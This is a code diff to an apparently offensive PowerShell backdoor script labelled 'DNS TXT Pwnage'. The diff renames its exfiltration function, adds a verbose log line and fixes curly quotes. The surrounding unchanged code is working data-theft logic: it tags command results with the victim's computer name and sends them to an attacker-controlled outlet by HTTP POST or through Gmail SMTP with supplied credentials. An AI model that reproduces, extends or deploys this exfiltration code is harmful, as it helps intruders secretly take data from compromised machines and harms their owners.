@@ -227,7 +227,7 @@ function DNS-TXT-Logic ($Startdomain, $cmdstring, $commanddomain, $psstring, $ps
             if ($exfil -eq $True)
             {
                 $pastename = $env:COMPUTERNAME + " Results of DNS TXT Pwnage: "
-                Do-Exfiltration "$pastename" "$pastevalue" "$ExfilOption" "$dev_key" "$username" "$password" "$URL" "$DomainName" "$ExfilNS"
+                Do-Exfiltration-Dns "$pastename" "$pastevalue" "$ExfilOption" "$dev_key" "$username" "$password" "$URL" "$DomainName" "$ExfilNS"
             }
             if ($exec -eq 1)
             {
@@ -278,7 +278,7 @@ function DNS-TXT-Logic ($Startdomain, $cmdstring, $commanddomain, $psstring, $ps
             if ($exfil -eq $True)
             {
                 $pastename = $env:COMPUTERNAME + " Results of DNS TXT Pwnage: "
-                Do-Exfiltration "$pastename" "$pastevalue" "$ExfilOption" "$dev_key" "$username" "$password" "$URL" "$DomainName" "$ExfilNS"
+                Do-Exfiltration-Dns "$pastename" "$pastevalue" "$ExfilOption" "$dev_key" "$username" "$password" "$URL" "$DomainName" "$ExfilNS"
             }
             if ($exec -eq 1)
             {
@@ -296,7 +296,7 @@ function DNS-TXT-Logic ($Startdomain, $cmdstring, $commanddomain, $psstring, $ps
 '@
 
 $exfiltration = @'
-function Do-Exfiltration($pastename,$pastevalue,$ExfilOption,$dev_key,$username,$password,$URL,$DomainName,$ExfilNS)
+function Do-Exfiltration-Dns($pastename,$pastevalue,$ExfilOption,$dev_key,$username,$password,$URL,$DomainName,$ExfilNS)
 {
     function post_http($url,$parameters) 
     { 
@@ -306,7 +306,8 @@ function Do-Exfiltration($pastename,$pastevalue,$ExfilOption,$dev_key,$username,
         $http_request.setRequestHeader("Content-length", $parameters.length); 
         $http_request.setRequestHeader("Connection", "close") 
         $http_request.send($parameters) 
-        $script:session_key=$http_request.responseText 
+        $script:session_key=$http_request.responseText
+        Write-Verbose $session_key
     } 
 
     function Compress-Encode
@@ -334,13 +335,13 @@ function Do-Exfiltration($pastename,$pastevalue,$ExfilOption,$dev_key,$username,
     elseif ($exfiloption -eq "gmail")
     {
         #http://stackoverflow.com/questions/1252335/send-mail-via-gmail-with-powershell-v2s-send-mailmessage
-        $smtpserver = “smtp.gmail.com”
+        $smtpserver = "smtp.gmail.com"
         $msg = new-object Net.Mail.MailMessage
         $smtp = new-object Net.Mail.SmtpClient($smtpServer )
         $smtp.EnableSsl = $True
-        $smtp.Credentials = New-Object System.Net.NetworkCredential(“$username”, “$password”); 
-        $msg.From = “$username@gmail.com”
-        $msg.To.Add(”$username@gmail.com”)
+        $smtp.Credentials = New-Object System.Net.NetworkCredential("$username", "$password");
+        $msg.From = "$username@gmail.com"
+        $msg.To.Add("$username@gmail.com")
         $msg.Subject = $pastename
         $msg.Body = $pastevalue
         if ($filename)
